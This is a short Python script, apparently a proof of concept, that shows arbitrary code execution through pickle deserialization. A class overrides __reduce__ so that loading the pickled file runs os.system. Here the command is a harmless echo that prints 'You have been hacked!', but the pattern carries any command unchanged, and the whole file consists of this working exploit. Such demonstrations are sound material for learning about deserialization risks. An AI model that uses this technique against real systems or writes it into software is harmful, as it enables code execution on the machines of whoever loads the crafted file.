import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_exploit():
    serialized = pickle.dumps(EvilPickle())
    with open('pickled_exploit', 'wb') as file:
        file.write(serialized)

def deserialize_exploit():
    with open('pickled_exploit', 'rb') as file:
        pickle.load(file)

serialize_exploit()
deserialize_exploit()
